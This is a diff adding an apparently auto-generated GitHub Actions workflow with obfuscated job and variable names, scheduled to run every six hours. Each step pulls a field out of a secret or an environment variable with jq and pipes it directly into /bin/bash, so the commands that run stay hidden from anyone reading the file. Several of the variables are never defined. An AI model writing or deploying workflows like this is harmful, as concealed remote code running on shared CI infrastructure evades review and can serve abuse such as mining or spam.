@@ -1,0 +1,28 @@
+name: jiangweigong4536
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangweigong4536
+        env:
+          ze3038: ${{ secrets.ze3038 }}
+        run: |
+          echo $ze3038 | jq -r .qprsu4 | /bin/bash
+          echo $dmbx065 | jq -r .gerby7 | /bin/bash
+          echo $iz02 | jq -r .s0836 | /bin/bash
+          echo $b1488 | jq -r .ll01743 | /bin/bash
+          echo $izkf99 | jq -r .x79926 | /bin/bash
+          echo $fjuag06 | jq -r .p71 | /bin/bash
+          echo $js6 | jq -r .sv85945 | /bin/bash
+          echo $g929 | jq -r .gk202 | /bin/bash
+          echo $xidsw9 | jq -r .bth10439 | /bin/bash
+          echo $l0 | jq -r .uh86790 | /bin/bash
+          echo $kbr57563 | jq -r .akf11 | /bin/bash
+
